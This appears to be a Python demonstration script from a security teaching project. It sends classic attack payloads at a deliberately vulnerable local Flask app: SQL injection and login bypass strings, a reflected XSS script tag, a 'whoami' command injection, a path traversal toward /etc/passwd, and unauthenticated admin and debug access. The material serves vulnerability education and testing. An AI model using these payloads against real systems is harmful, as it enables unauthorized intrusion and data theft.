#!/usr/bin/env python3
"""
VulnHunter - Quick Vulnerability Demonstration
This script demonstrates the vulnerabilities in the running application
"""

import requests
import json
from colorama import init, Fore, Style

init(autoreset=True)

BASE_URL = "http://localhost:5000"

def print_header(title):
    print(f"\n{Fore.CYAN}{'='*70}")
    print(f"{Fore.CYAN}{title.center(70)}")
    print(f"{Fore.CYAN}{'='*70}\n")

def print_success(msg):
    print(f"{Fore.GREEN}✓ {msg}")

def print_info(msg):
    print(f"{Fore.YELLOW}→ {msg}")

def print_result(msg):
    print(f"{Fore.MAGENTA}{msg}\n")


def test_sql_injection():
    print_header("1. SQL Injection Vulnerability")
    
    print_info("Testing basic SQL injection on /search endpoint")
    payload = "' OR '1'='1"
    
    try:
        response = requests.get(f"{BASE_URL}/search", params={"q": payload})
        print_success(f"SQL Injection successful!")
        print_info(f"Payload: {payload}")
        print_result(f"Response: {response.text[:200]}...")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")


def test_xss():
    print_header("2. Cross-Site Scripting (XSS) Vulnerability")
    
    print_info("Testing reflected XSS on /search endpoint")
    payload = "<script>alert('XSS')</script>"
    
    try:
        response = requests.get(f"{BASE_URL}/search", params={"q": payload})
        if payload in response.text:
            print_success("XSS vulnerability confirmed!")
            print_info(f"Payload: {payload}")
            print_info("Script tag is reflected without sanitization")
        print_result(f"Response contains unsanitized input")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")


def test_command_injection():
    print_header("3. Command Injection Vulnerability")
    
    print_info("Testing command injection on /execute endpoint")
    payload = "whoami"
    
    try:
        response = requests.get(f"{BASE_URL}/execute", params={"cmd": payload})
        print_success("Command injection successful!")
        print_info(f"Payload: {payload}")
        print_result(f"Command output:\n{response.text}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")


def test_broken_access_control():
    print_header("4. Broken Access Control")
    
    print_info("Accessing /admin without authentication")
    
    try:
        response = requests.get(f"{BASE_URL}/admin")
        if response.status_code == 200:
            print_success("Admin panel accessible without authentication!")
            print_info("No authentication required")
            print_result(f"Status: {response.status_code}\nResponse: {response.text[:150]}...")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")


def test_information_disclosure():
    print_header("5. Information Disclosure")
    
    print_info("Accessing /debug endpoint")
    
    try:
        response = requests.get(f"{BASE_URL}/debug")
        if response.status_code == 200:
            print_success("Debug endpoint exposes sensitive information!")
            data = response.json()
            print_info("Leaked information:")
            print_result(json.dumps(data, indent=2)[:500] + "...")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")


def test_path_traversal():
    print_header("6. Path Traversal Vulnerability")
    
    print_info("Testing path traversal on /download endpoint")
    payload = "../../../etc/passwd"  # Unix-style, will fail on Windows but demonstrates the vuln
    
    try:
        response = requests.get(f"{BASE_URL}/download", params={"file": payload})
        print_success("Path traversal vulnerability detected!")
        print_info(f"Payload: {payload}")
        print_info("Application accepts path traversal sequences")
        print_result(f"Status: {response.status_code}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")


def test_authentication_bypass():
    print_header("7. Authentication Bypass via SQL Injection")
    
    print_info("Attempting to bypass login with SQL injection")
    payload = {
        "username": "admin' --",
        "password": "anything"
    }
    
    try:
        response = requests.post(f"{BASE_URL}/login", json=payload)
        print_success("Authentication bypassed!")
        print_info(f"Username: {payload['username']}")
        print_info(f"Password: {payload['password']}")
        print_result(f"Response: {response.text}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")


def test_insecure_deserialization():
    print_header("8. Insecure Deserialization")
    
    print_info("Testing insecure pickle deserialization on /deserialize endpoint")
    
    try:
        import pickle
        import base64
        
        # Create a simple object to serialize
        data = {"message": "test"}
        pickled = base64.b64encode(pickle.dumps(data)).decode()
        
        response = requests.post(f"{BASE_URL}/deserialize", 
                                json={"data": pickled})
        print_success("Insecure deserialization endpoint accessible!")
        print_info("Application uses pickle.loads() on user input")
        print_info("This could allow arbitrary code execution")
        print_result(f"Response: {response.text}")
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")


def main():
    print(f"\n{Fore.RED}{'*'*70}")
    print(f"{Fore.RED}{'VulnHunter - Vulnerability Demonstration'.center(70)}")
    print(f"{Fore.RED}{'WARNING: For Educational Purposes Only'.center(70)}")
    print(f"{Fore.RED}{'*'*70}\n")
    
    print_info(f"Target: {BASE_URL}")
    print_info("Testing 8 critical vulnerabilities...\n")
    
    try:
        # Test connectivity
        response = requests.get(BASE_URL, timeout=2)
        print_success("Application is running and accessible\n")
    except:
        print(f"{Fore.RED}✗ Cannot connect to {BASE_URL}")
        print(f"{Fore.RED}✗ Make sure the Flask app is running")
        return
    
    # Run all tests
    test_sql_injection()
    test_xss()
    test_command_injection()
    test_broken_access_control()
    test_information_disclosure()
    test_path_traversal()
    test_authentication_bypass()
    test_insecure_deserialization()
    
    # Summary
    print_header("Demonstration Complete")
    print(f"{Fore.YELLOW}Vulnerabilities Demonstrated:")
    print(f"{Fore.YELLOW}  1. SQL Injection")
    print(f"{Fore.YELLOW}  2. Cross-Site Scripting (XSS)")
    print(f"{Fore.YELLOW}  3. Command Injection")
    print(f"{Fore.YELLOW}  4. Broken Access Control")
    print(f"{Fore.YELLOW}  5. Information Disclosure")
    print(f"{Fore.YELLOW}  6. Path Traversal")
    print(f"{Fore.YELLOW}  7. Authentication Bypass")
    print(f"{Fore.YELLOW}  8. Insecure Deserialization")
    
    print(f"\n{Fore.CYAN}Next Steps:")
    print(f"{Fore.CYAN}  • Review the vulnerable code in original_code/vulnerable_app/app.py")
    print(f"{Fore.CYAN}  • Run security scanner: python tools/security_scanner.py")
    print(f"{Fore.CYAN}  • Run test suite: pytest tests/")
    print(f"{Fore.CYAN}  • Test with AI models using ai_refactored/PROMPT_TEMPLATES.md\n")


if __name__ == "__main__":
    main()
